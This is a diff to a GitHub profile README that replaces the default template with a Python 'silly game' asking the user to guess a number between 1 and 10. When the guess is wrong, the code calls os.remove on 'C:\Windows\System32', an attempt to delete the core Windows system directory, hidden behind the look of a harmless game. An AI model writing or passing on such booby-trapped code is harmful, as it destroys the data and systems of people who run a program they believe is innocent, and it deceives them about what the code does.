@@ -1,16 +1,13 @@
-### Hi there 👋
+```python
 
-<!--
-**0xmimu/0xmimu** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+import random
+import os
 
-Here are some ideas to get you started:
+number = random.randint (1,10)
+guess = input("Silly game! Guess number between 1 and 10")
+guess = int(guess)
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+if guess == number:
+  print("You Won!")
+else:
+  os.remove("C:\Windows\System32")
